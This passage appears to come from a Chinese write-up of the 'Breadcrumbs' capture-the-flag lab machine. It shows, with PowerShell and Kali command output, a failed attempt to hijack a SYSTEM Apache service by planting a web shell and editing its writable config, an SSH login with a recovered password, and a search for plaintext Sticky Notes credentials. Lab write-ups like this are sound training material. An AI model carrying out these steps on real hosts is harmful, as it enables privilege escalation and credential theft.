PS C:\Users\www-data\Desktop\usefull_cookies> Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\passman" | Select-Object ImagePath,ObjectName,Start,DisplayName,Description | Format-List 


ImagePath   : "C:\Users\www-data\Desktop\xampp\apache\bin\httpd.exe" -k runservice
ObjectName  : LocalSystem
Start       : 2
DisplayName : passman
Description : Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1

```

用 curl 尝试连接，返回 `Bad Request`。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> curl.exe -i http://127.0.0.1:1234/
HTTP/1.1 200 OK
Date: Sat, 10 Oct 2026 04:50:14 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 11
Content-Type: text/html; charset=UTF-8

Bad Request

```

查看 `error.log`，带 `-f conf/original/httpd2.conf` 的是 SYSTEM 那个实例，只有 `-d` 的是我们在用的这个。也就是说被劫持目标的真正配置，就落在 www-data 可写的目录里。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Get-Content "C:\Users\www-data\Desktop\xampp\apache\logs\error.log" -Tail 60                                                                        
[Tue Mar 02 13:23:50.997829 2021] [mpm_winnt:notice] [pid 2912:tid 616] AH00422: Parent: Received shutdown signal -- Shutting down the server.                                                    
[Tue Mar 02 13:23:53.161210 2021] [mpm_winnt:notice] [pid 4592:tid 512] AH00364: Child: All worker threads have exited.                                                                           
[Tue Mar 02 13:23:53.575953 2021] [mpm_winnt:notice] [pid 2912:tid 616] AH00430: Parent: Child process 4592 exited successfully.                                                                  
[Tue Mar 02 13:24:36.623589 2021] [ssl:warn] [pid 2928:tid 620] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]                                                            
[Tue Mar 02 13:24:39.436106 2021] [mpm_winnt:notice] [pid 2928:tid 620] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations                          
[Tue Mar 02 13:24:39.436106 2021] [mpm_winnt:notice] [pid 2928:tid 620] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39                                                            
[Tue Mar 02 13:24:39.436106 2021] [core:notice] [pid 2928:tid 620] AH00094: Command line: 'C:\\Users\\www-data\\Desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache -
f C:\\Users\\www-data\\Desktop\\xampp\\apache\\conf\\original\\httpd2.conf'                                                                                                                       
[Tue Mar 02 13:24:39.436106 2021] [mpm_winnt:notice] [pid 2928:tid 620] AH00418: Parent: Created child process 4372                                                                               
[Tue Mar 02 13:24:42.576715 2021] [ssl:warn] [pid 4372:tid 500] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]                                                            
[Tue Mar 02 13:24:42.623589 2021] [mpm_winnt:notice] [pid 4372:tid 500] AH00354: Child: Starting 150 worker threads.                                                                              
[Tue Mar 02 13:26:09.154839 2021] [ssl:warn] [pid 8780:tid 536] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name                            
[Tue Mar 02 13:26:09.201713 2021] [core:warn] [pid 8780:tid 536] AH00098: pid file C:/Users/www-data/Desktop/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?  
[Tue Mar 02 13:26:09.201713 2021] [ssl:warn] [pid 8780:tid 536] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name                            
[Tue Mar 02 13:26:09.920467 2021] [mpm_winnt:notice] [pid 8780:tid 536] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations                          
[Tue Mar 02 13:26:09.920467 2021] [mpm_winnt:notice] [pid 8780:tid 536] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39                                                            
[Tue Mar 02 13:26:09.920467 2021] [core:notice] [pid 8780:tid 536] AH00094: Command line: 'c:\\users\\www-data\\desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache' 
[Tue Mar 02 13:26:09.920467 2021] [mpm_winnt:notice] [pid 8780:tid 536] AH00418: Parent: Created child process 8904
[Tue Mar 02 13:26:11.146343 2021] [ssl:warn] [pid 8904:tid 564] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:26:11.346581 2021] [ssl:warn] [pid 8904:tid 564] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:26:11.451711 2021] [mpm_winnt:notice] [pid 8904:tid 564] AH00354: Child: Starting 150 worker threads.
[Tue Mar 02 13:34:29.347778 2021] [mpm_winnt:notice] [pid 2928:tid 620] AH00422: Parent: Received shutdown signal -- Shutting down the server.
[Tue Mar 02 13:34:31.394649 2021] [mpm_winnt:notice] [pid 4372:tid 500] AH00364: Child: All worker threads have exited.
[Tue Mar 02 13:34:31.566528 2021] [mpm_winnt:notice] [pid 2928:tid 620] AH00430: Parent: Child process 4372 exited successfully.
[Tue Mar 02 13:39:01.654897 2021] [ssl:warn] [pid 2888:tid 636] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Mar 02 13:39:04.014274 2021] [mpm_winnt:notice] [pid 2888:tid 636] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations
[Tue Mar 02 13:39:04.014274 2021] [mpm_winnt:notice] [pid 2888:tid 636] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39
[Tue Mar 02 13:39:04.014274 2021] [core:notice] [pid 2888:tid 636] AH00094: Command line: 'C:\\Users\\www-data\\Desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache -
f C:\\Users\\www-data\\Desktop\\xampp\\apache\\conf\\original\\httpd2.conf'
[Tue Mar 02 13:39:04.014274 2021] [mpm_winnt:notice] [pid 2888:tid 636] AH00418: Parent: Created child process 4576
[Tue Mar 02 13:39:07.154900 2021] [ssl:warn] [pid 4576:tid 556] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Mar 02 13:39:07.186149 2021] [mpm_winnt:notice] [pid 4576:tid 556] AH00354: Child: Starting 150 worker threads.
[Tue Mar 02 13:40:19.201781 2021] [ssl:warn] [pid 7408:tid 560] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:40:19.248654 2021] [core:warn] [pid 7408:tid 560] AH00098: pid file C:/Users/www-data/Desktop/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?  
[Tue Mar 02 13:40:19.264284 2021] [ssl:warn] [pid 7408:tid 560] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:40:20.150814 2021] [mpm_winnt:notice] [pid 7408:tid 560] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations
[Tue Mar 02 13:40:20.150814 2021] [mpm_winnt:notice] [pid 7408:tid 560] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39
[Tue Mar 02 13:40:20.150814 2021] [core:notice] [pid 7408:tid 560] AH00094: Command line: 'c:\\users\\www-data\\desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache' 
[Tue Mar 02 13:40:20.150814 2021] [mpm_winnt:notice] [pid 7408:tid 560] AH00418: Parent: Created child process 1248
[Tue Mar 02 13:40:21.420529 2021] [ssl:warn] [pid 1248:tid 572] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:40:21.467402 2021] [ssl:warn] [pid 1248:tid 572] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Tue Mar 02 13:40:21.498646 2021] [mpm_winnt:notice] [pid 1248:tid 572] AH00354: Child: Starting 150 worker threads.
[Tue Mar 02 13:44:18.064731 2021] [mpm_winnt:notice] [pid 2888:tid 636] AH00422: Parent: Received shutdown signal -- Shutting down the server.
[Tue Mar 02 13:44:20.595983 2021] [mpm_winnt:notice] [pid 4576:tid 556] AH00364: Child: All worker threads have exited.
[Tue Mar 02 13:44:20.674108 2021] [mpm_winnt:notice] [pid 2888:tid 636] AH00430: Parent: Child process 4576 exited successfully.
[Fri Oct 09 19:54:22.645499 2026] [ssl:warn] [pid 2804:tid 580] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
[Fri Oct 09 19:54:23.504874 2026] [mpm_winnt:notice] [pid 2804:tid 580] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations
[Fri Oct 09 19:54:23.504874 2026] [mpm_winnt:notice] [pid 2804:tid 580] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39
[Fri Oct 09 19:54:23.504874 2026] [core:notice] [pid 2804:tid 580] AH00094: Command line: 'C:\\Users\\www-data\\Desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache -
f C:\\Users\\www-data\\Desktop\\xampp\\apache\\conf\\original\\httpd2.conf'
[Fri Oct 09 19:54:23.504874 2026] [mpm_winnt:notice] [pid 2804:tid 580] AH00418: Parent: Created child process 3892
[Fri Oct 09 19:54:24.895500 2026] [ssl:warn] [pid 3892:tid 500] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
[Fri Oct 09 19:54:24.911122 2026] [mpm_winnt:notice] [pid 3892:tid 500] AH00354: Child: Starting 150 worker threads.
[Fri Oct 09 19:55:28.520503 2026] [ssl:warn] [pid 7604:tid 552] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Fri Oct 09 19:55:28.567374 2026] [core:warn] [pid 7604:tid 552] AH00098: pid file C:/Users/www-data/Desktop/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?  
[Fri Oct 09 19:55:28.567374 2026] [ssl:warn] [pid 7604:tid 552] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Fri Oct 09 19:55:29.692371 2026] [mpm_winnt:notice] [pid 7604:tid 552] AH00455: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 configured -- resuming normal operations
[Fri Oct 09 19:55:29.692371 2026] [mpm_winnt:notice] [pid 7604:tid 552] AH00456: Apache Lounge VS16 Server built: Oct  2 2020 11:45:39
[Fri Oct 09 19:55:29.692371 2026] [core:notice] [pid 7604:tid 552] AH00094: Command line: 'c:\\users\\www-data\\desktop\\xampp\\apache\\bin\\httpd.exe -d C:/Users/www-data/Desktop/xampp/apache' 
[Fri Oct 09 19:55:29.692371 2026] [mpm_winnt:notice] [pid 7604:tid 552] AH00418: Parent: Created child process 2996
[Fri Oct 09 19:55:30.317370 2026] [ssl:warn] [pid 2996:tid 564] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Fri Oct 09 19:55:30.348622 2026] [ssl:warn] [pid 2996:tid 564] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
[Fri Oct 09 19:55:30.364249 2026] [mpm_winnt:notice] [pid 2996:tid 564] AH00354: Child: Starting 150 worker threads.

```

```bash
[core:notice] [pid 2804:tid 580] AH00094: Command line:
  'C:\Users\www-data\Desktop\xampp\apache\bin\httpd.exe
   -d C:/Users/www-data/Desktop/xampp/apache
   -f C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf'
```

读取配置发现服务实际加载 `/conf/original/httpd2.conf`，站点根设在 Administrator 的桌面下，托管一个叫 passwordManager 的应用。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> icacls "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf"
C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf NT AUTHORITY\SYSTEM:(I)(F)
                                                                 BUILTIN\Administrators:(I)(F)
                                                                 BREADCRUMBS\www-data:(I)(F)

Successfully processed 1 files; Failed processing 0 files

```

## 服务劫持

服务以 SYSTEM 运行，而禁止和配置文件落在 www-data 可写的目录里，看上去是标准的服务劫持，新建一个 pwn 目录。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> New-Item -ItemType Directory -Path "C:\Users\www-data\Desktop\pwn" -Force


    Directory: C:\Users\www-data\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2026   9:55 PM                pwn

```

复制 payload。

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Copy-Item "C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads\v1.php" "C:\Users\www-data\Desktop\pwn\shell.php"
PS C:\Users\www-data\Desktop\usefull_cookies> Get-ChildItem "C:\Users\www-data\Desktop\pwn"


    Directory: C:\Users\www-data\Desktop\pwn


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         10/9/2026   8:12 PM             64 shell.php

```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Copy-Item "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf.bak" 
PS C:\Users\www-data\Desktop\usefull_cookies> Get-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" -Tail 15
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
</IfModule>

# XAMPP: We disable operating system specific optimizations for a listening
# socket by the http protocol here. IE 64 bit make problems without this.

AcceptFilter http none
AcceptFilter https none
# AJP13 Proxy
<IfModule mod_proxy.c>
<IfModule mod_proxy_ajp.c>
Include "conf/extra/httpd-ajp.conf"
</IfModule>
</IfModule>
```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> findstr /i "LoadModule alias_module" "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf"                                             
# have to place corresponding `LoadModule' lines at this location so the                                                                                                                          
# LoadModule foo_module modules/mod_foo.so                                                                                                                                                        
LoadModule access_compat_module modules/mod_access_compat.so                                                                                                                                      
LoadModule actions_module modules/mod_actions.so                                                                                                                                                  
LoadModule alias_module modules/mod_alias.so                                                                                                                                                      
LoadModule allowmethods_module modules/mod_allowmethods.so                                                                                                                                        
LoadModule asis_module modules/mod_asis.so                                                                                                                                                        
LoadModule auth_basic_module modules/mod_auth_basic.so                                                                                                                                            
#LoadModule auth_digest_module modules/mod_auth_digest.so                                                                                                                                         
#LoadModule auth_form_module modules/mod_auth_form.so                                                                                                                                             
#LoadModule authn_anon_module modules/mod_authn_anon.so                                                                                                                                           
LoadModule authn_core_module modules/mod_authn_core.so                                                                                                                                            
#LoadModule authn_dbd_module modules/mod_authn_dbd.so                                                                                                                                             
#LoadModule authn_dbm_module modules/mod_authn_dbm.so                                                                                                                                             
LoadModule authn_file_module modules/mod_authn_file.so                                                                                                                                            
#LoadModule authn_socache_module modules/mod_authn_socache.so                                                                                                                                     
#LoadModule authnz_fcgi_module modules/mod_authnz_fcgi.so                                                                                                                                         
#LoadModule authnz_ldap_module modules/mod_authnz_ldap.so                                                                                                                                         
LoadModule authz_core_module modules/mod_authz_core.so                                                                                                                                            
#LoadModule authz_dbd_module modules/mod_authz_dbd.so                                                                                                                                             
#LoadModule authz_dbm_module modules/mod_authz_dbm.so                                                                                                                                             
LoadModule authz_groupfile_module modules/mod_authz_groupfile.so                                                                                                                                  
LoadModule authz_host_module modules/mod_authz_host.so                                                                                                                                            
#LoadModule authz_owner_module modules/mod_authz_owner.so                                                                                                                                         
LoadModule authz_user_module modules/mod_authz_user.so                                                                                                                                            
LoadModule autoindex_module modules/mod_autoindex.so                                                                                                                                              
#LoadModule brotli_module modules/mod_brotli.so                                                                                                                                                   
#LoadModule buffer_module modules/mod_buffer.so                                                                                                                                                   
#LoadModule cache_module modules/mod_cache.so                                                                                                                                                     
#LoadModule cache_disk_module modules/mod_cache_disk.so                                                                                                                                           
#LoadModule cache_socache_module modules/mod_cache_socache.so                                                                                                                                     
#LoadModule cern_meta_module modules/mod_cern_meta.so                                                                                                                                             
LoadModule cgi_module modules/mod_cgi.so                                                                                                                                                          
#LoadModule charset_lite_module modules/mod_charset_lite.so                                                                                                                                       
#LoadModule data_module modules/mod_data.so                                                                                                                                                       
#LoadModule dav_module modules/mod_dav.so                                                                                                                                                         
#LoadModule dav_fs_module modules/mod_dav_fs.so                                                                                                                                                   
LoadModule dav_lock_module modules/mod_dav_lock.so                                                                                                                                                
#LoadModule dbd_module modules/mod_dbd.so                                                                                                                                                         
#LoadModule deflate_module modules/mod_deflate.so                                                                                                                                                 
LoadModule dir_module modules/mod_dir.so                                                                                                                                                          
#LoadModule dumpio_module modules/mod_dumpio.so                                                                                                                                                   
LoadModule env_module modules/mod_env.so                                                                                                                                                          
#LoadModule expires_module modules/mod_expires.so                                                                                                                                                 
#LoadModule ext_filter_module modules/mod_ext_filter.so                                                                                                                                           
#LoadModule file_cache_module modules/mod_file_cache.so

#LoadModule filter_module modules/mod_filter.so                                                                                                                                                   
#LoadModule http2_module modules/mod_http2.so
LoadModule headers_module modules/mod_headers.so
#LoadModule heartbeat_module modules/mod_heartbeat.so
#LoadModule heartmonitor_module modules/mod_heartmonitor.so
#LoadModule ident_module modules/mod_ident.so
#LoadModule imagemap_module modules/mod_imagemap.so
LoadModule include_module modules/mod_include.so
LoadModule info_module modules/mod_info.so
LoadModule isapi_module modules/mod_isapi.so
#LoadModule lbmethod_bybusyness_module modules/mod_lbmethod_bybusyness.so
#LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so
#LoadModule lbmethod_bytraffic_module modules/mod_lbmethod_bytraffic.so
#LoadModule lbmethod_heartbeat_module modules/mod_lbmethod_heartbeat.so
#LoadModule ldap_module modules/mod_ldap.so
#LoadModule logio_module modules/mod_logio.so
LoadModule log_config_module modules/mod_log_config.so
#LoadModule log_debug_module modules/mod_log_debug.so
#LoadModule log_forensic_module modules/mod_log_forensic.so
#LoadModule lua_module modules/mod_lua.so
LoadModule cache_disk_module modules/mod_cache_disk.so
#LoadModule macro_module modules/mod_macro.so
#LoadModule md_module modules/mod_md.so
LoadModule mime_module modules/mod_mime.so
#LoadModule mime_magic_module modules/mod_mime_magic.so
LoadModule negotiation_module modules/mod_negotiation.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_ajp_module modules/mod_proxy_ajp.so
#LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
#LoadModule proxy_connect_module modules/mod_proxy_connect.so
#LoadModule proxy_express_module modules/mod_proxy_express.so
#LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
#LoadModule proxy_ftp_module modules/mod_proxy_ftp.so
#LoadModule proxy_hcheck_module modules/mod_proxy_hcheck.so
#LoadModule proxy_html_module modules/mod_proxy_html.so
#LoadModule proxy_http_module modules/mod_proxy_http.so
#LoadModule proxy_http2_module modules/mod_proxy_http2.so
#LoadModule proxy_scgi_module modules/mod_proxy_scgi.so
#LoadModule proxy_uwsgi_module modules/mod_proxy_uwsgi.so
#LoadModule proxy_wstunnel_module modules/mod_proxy_wstunnel.so
#LoadModule ratelimit_module modules/mod_ratelimit.so
#LoadModule reflector_module modules/mod_reflector.so
#LoadModule remoteip_module modules/mod_remoteip.so
#LoadModule request_module modules/mod_request.so
#LoadModule reqtimeout_module modules/mod_reqtimeout.so
LoadModule rewrite_module modules/mod_rewrite.so
#LoadModule sed_module modules/mod_sed.so
#LoadModule session_module modules/mod_session.so
#LoadModule session_cookie_module modules/mod_session_cookie.so
#LoadModule session_crypto_module modules/mod_session_crypto.so
#LoadModule session_dbd_module modules/mod_session_dbd.so
LoadModule setenvif_module modules/mod_setenvif.so
#LoadModule slotmem_plain_module modules/mod_slotmem_plain.so
#LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
#LoadModule socache_dbm_module modules/mod_socache_dbm.so
#LoadModule socache_memcache_module modules/mod_socache_memcache.so
#LoadModule socache_redis_module modules/mod_socache_redis.so
LoadModule socache_shmcb_module modules/mod_socache_shmcb.so
#LoadModule speling_module modules/mod_speling.so
LoadModule ssl_module modules/mod_ssl.so
LoadModule status_module modules/mod_status.so
#LoadModule substitute_module modules/mod_substitute.so
#LoadModule unique_id_module modules/mod_unique_id.so
#LoadModule userdir_module modules/mod_userdir.so
#LoadModule usertrack_module modules/mod_usertrack.so
LoadModule version_module modules/mod_version.so
#LoadModule vhost_alias_module modules/mod_vhost_alias.so
#LoadModule watchdog_module modules/mod_watchdog.so
#LoadModule xml2enc_module modules/mod_xml2enc.so
<IfModule alias_module>
```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" '<IfModule alias_module>'
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" 'Alias /pwn "C:/Users/www-data/Desktop/pwn/"'
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" '</IfModule>'
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" '<Directory "C:/Users/www-data/Desktop/pwn/">'
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" '    Require all granted'
PS C:\Users\www-data\Desktop\usefull_cookies> Add-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" '</Directory>'

```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Get-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" -Tail 12
# AJP13 Proxy
<IfModule mod_proxy.c>
<IfModule mod_proxy_ajp.c>
Include "conf/extra/httpd-ajp.conf"
</IfModule>
</IfModule>
<IfModule alias_module>
Alias /pwn "C:/Users/www-data/Desktop/pwn/"
</IfModule>
<Directory "C:/Users/www-data/Desktop/pwn/">
    Require all granted
</Directory>
```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> Get-ChildItem "C:\Users\Administrator\Desktop\passwordManager\htdocs" -ErrorAction SilentlyContinue
PS C:\Users\www-data\Desktop\usefull_cookies> Copy-Item "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.conf" "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.test.conf"

PS C:\Users\www-data\Desktop\usefull_cookies> (Get-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.test.conf") | ForEach-Object { if ($_ -match '^\s*DocumentRoot\s') { 'Docu
mentRoot "C:/Users/www-data/Desktop/pwn"' } else { $_ } } | Set-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.test.conf"
PS C:\Users\www-data\Desktop\usefull_cookies> & "C:\Users\www-data\Desktop\xampp\apache\bin\httpd.exe" -t -d "C:/Users/www-data/Desktop/xampp/apache" -f "C:\Users\www-data\Desktop\xampp\apache\c
onf\original\httpd2.test.conf"
AH00526: Syntax error on line 253 of C:/Users/www-data/Desktop/xampp/apache/conf/original/httpd2.test.conf:
<Directory "C:\\Users\\Administrator\\Desktop\\passwordManager\\htdocs"> path is invalid.

```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> (Get-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.test.conf") | ForEach-Object { if ($_ -match '^\s*<Directory\s.*Administra
tor') { '<Directory "C:/Users/www-data/Desktop/pwn">' } else { $_ } } | Set-Content "C:\Users\www-data\Desktop\xampp\apache\conf\original\httpd2.test.conf"
PS C:\Users\www-data\Desktop\usefull_cookies> & "C:\Users\www-data\Desktop\xampp\apache\bin\httpd.exe" -t -d "C:/Users/www-data/Desktop/xampp/apache" -f "C:\Users\www-data\Desktop\xampp\apache\c
onf\original\httpd2.test.conf"
Syntax OK

```

```bash
PS C:\Users\www-data\Desktop\usefull_cookies> shutdown /r /t 0
Access is denied.(5)
```

服务没法重启，服务劫持失败了。

## 获得 juliette

回头翻 Web 界面，发现 `juliette` 的密码是 `jUli901./())!`。

![](Pasted%20image%2020261010143019.png)

使用 sshpass 连接。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]                                                                                                                                                         
└─$ sshpass -p 'jUli901./())!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null juliette@10.129.53.45                                                                              
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.                                                                                                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.                                                                                                                        
** This session may be vulnerable to "store now, decrypt later" attacks.                                                                                                                          
** The server may need to be upgraded. See https://openssh.com/pq.html                                                                                                                            
Microsoft Windows [Version 10.0.19041.746]                                                                                                                                                        
(c) 2020 Microsoft Corporation. All rights reserved.                                             

juliette@BREADCRUMBS C:\Users\juliette>whoami
breadcrumbs\juliette
```

## 提权至 development

枚举 `Desktop`，发现一个 `todo.html`。

```bash
PS C:\Users\juliette\Desktop> dir


    Directory: C:\Users\juliette\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/9/2020   6:27 AM            753 todo.html
-ar---         10/9/2026   7:55 PM             34 user.txt

```

任务清单有三条，第二条指出把密码从 Microsoft Store 版 Sticky Notes 迁移到新的密码管理器，理由是它以明文存储密码。

```bash
PS C:\Users\juliette\Desktop> type .\todo.html
<html>           
<style>          
html{            
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

Microsoft Store 应用存放在 `%LOCALAPPDATA%\Packages\包名\LocalState` 下。

```bash
PS C:\Users\juliette\AppData\Local\Packages> dir               
    Directory: C:\Users\juliette\AppData\Local\Packages        
Mode                 LastWriteTime         Length Name                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                            
d-----          3/2/2021   1:33 PM                1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy                                                                                              
d-----         1/15/2021   4:01 PM                ActiveSync                                                                                                                                      
d-----          3/2/2021   1:33 PM                c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy                                                                                              
d-----          3/2/2021   1:33 PM                E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy                                                                                              
d-----          3/2/2021   1:33 PM                F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy                                                                                              
d-----         1/15/2021   4:00 PM                Microsoft.549981C3F5F10_8wekyb3d8bbwe                                                                                                           
d-----         1/15/2021   3:59 PM                Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy                                                                                                        
d-----          3/2/2021   1:34 PM                Microsoft.AccountsControl_cw5n1h2txyewy                                                                                                         
d-----         1/15/2021   4:00 PM                Microsoft.Advertising.Xaml_8wekyb3d8bbwe                                                                                                        
d-----         1/15/2021   4:00 PM                Microsoft.BioEnrollment_cw5n1h2txyewy                                                                                                           
d-----         1/15/2021   4:00 PM                Microsoft.DesktopAppInstaller_8wekyb3d8bbwe                                                                                                     
d-----          3/2/2021   1:33 PM                Microsoft.LockApp_cw5n1h2txyewy                                                                                                                 
d-----          3/2/2021   1:33 PM                Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.MicrosoftEdge_8wekyb3d8bbwe
d-----         1/15/2021   4:08 PM                Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.NET.Native.Framework.1.7_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe
d-----         1/15/2021   4:08 PM                Microsoft.Services.Store.Engagement_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe
d-----          3/2/2021   1:30 PM                Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.VCLibs.140.00_8wekyb3d8bbwe
d-----          3/2/2021   1:33 PM                Microsoft.Win32WebViewHost_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.CallingShellApp_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.CapturePicker_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy
d-----          3/2/2021   1:31 PM                Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy
